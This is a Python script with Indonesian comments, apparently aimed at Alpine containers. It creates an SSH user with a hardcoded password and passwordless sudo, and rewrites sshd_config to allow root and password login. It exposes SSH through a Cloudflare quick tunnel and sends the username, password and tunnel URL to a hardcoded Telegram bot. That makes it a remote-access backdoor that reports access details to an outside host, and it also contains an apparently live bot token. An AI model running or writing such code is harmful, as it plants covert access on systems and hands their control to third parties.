import subprocess
import time
import re
import os
import shutil
import sys
import urllib.request
import urllib.parse

# --- KONFIGURASI ---
TOKEN = "7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk"
CHAT_ID = "2029488529"
USER_SSH = "system-thc"
PASS_SSH = "cokaberul123"
SSH_PORT = "2222"
LOG_FILE = "/tmp/cloudflared.log"

def run_cmd(cmd):
    """Menjalankan perintah shell dengan penanganan error Alpine."""
    try:
        # Menambahkan env PATH agar binary yang baru diinstall langsung terbaca
        subprocess.run(cmd, shell=True, check=True, env=os.environ.update({"PATH": "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"}))
        return True
    except:
        return False

def setup_alpine_ssh():
    print("[-] Menyiapkan SSH di Alpine Minimalis...")
    
    # 1. Gunakan --no-cache untuk menghemat space di Alpine minimalis
    run_cmd("apk add --no-cache openssh sudo wget coreutils shadow")

    # 2. Buat User & Group (Force create jika minimalis)
    run_cmd(f"grep -q ^{USER_SSH} /etc/passwd || adduser -D -s /bin/sh {USER_SSH}")
    run_cmd(f"echo '{USER_SSH}:{PASS_SSH}' | chpasswd")
    
    # 3. Sudoers (Alpine minimalis seringkali belum punya folder /etc/sudoers.d)
    run_cmd("mkdir -p /etc/sudoers.d")
    with open(f"/etc/sudoers.d/{USER_SSH}", "w") as f:
        f.write(f"{USER_SSH} ALL=(ALL) NOPASSWD: ALL")
    run_cmd(f"chmod 0440 /etc/sudoers.d/{USER_SSH}")

    # 4. Generate Host Keys (Penting: SSHD Alpine tidak akan jalan tanpa ini)
    run_cmd("ssh-keygen -A")
    
    # 5. Config SSHD Minimalis
    ssh_config = f"Port {SSH_PORT}\nPasswordAuthentication yes\nPermitRootLogin yes\n"
    with open("/etc/ssh/sshd_config", "w") as f:
        f.write(ssh_config)
    
    # 6. Jalankan daemon
    run_cmd("/usr/sbin/sshd")

def check_cloudflared():
    print("[-] Cek Cloudflared untuk Alpine (Musl/Static)...")
    target = "/usr/local/bin/cloudflared"
    
    if not shutil.which("cloudflared"):
        # PENTING: Gunakan versi amd64 standar karena sudah statically linked (bisa jalan di musl)
        # Jangan pakai versi 'linux-musl' karena kadang bermasalah di Docker Alpine tertentu
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        run_cmd(f"wget {url} -O {target}")
        run_cmd(f"chmod +x {target}")

def start_tunnel():
    print(f"[-] Menghidupkan Tunnel Cloudflare ke Port {SSH_PORT}...")
    run_cmd("pkill -9 cloudflared")
    
    if os.path.exists(LOG_FILE):
        try: os.remove(LOG_FILE)
        except: pass

    # Gunakan --no-autoupdate karena Alpine minimalis sering gagal saat proses update self-binary
    cmd = f"nice -n 19 cloudflared tunnel --no-autoupdate --url tcp://localhost:{SSH_PORT} > {LOG_FILE} 2>&1 &"
    subprocess.Popen(cmd, shell=True)

    # Re-logic pencarian URL agar lebih cepat
    timeout = 45
    start_time = time.time()
    while time.time() - start_time < timeout:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                log = f.read()
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', log)
                if match:
                    send_telegram(match.group(0))
                    return
        time.sleep(2)
    print("[!] Timeout: URL tidak ditemukan di log.")

def send_telegram(url):
    import urllib.request, urllib.parse
    msg = (
        "🏔️ **ALPINE MINIMAL ACCESS** 🏔️\n\n"
        f"👤 **User:** `{USER_SSH}`\n"
        f"🔑 **Pass:** `{PASS_SSH}`\n"
        f"🌐 **Link:** `{url}`"
    )
    api_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = urllib.parse.urlencode({'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'}).encode()
    try:
        urllib.request.urlopen(api_url, data=data, timeout=10)
    except:
        pass

if __name__ == "__main__":
    setup_alpine_ssh()
    check_cloudflared()
    start_tunnel()
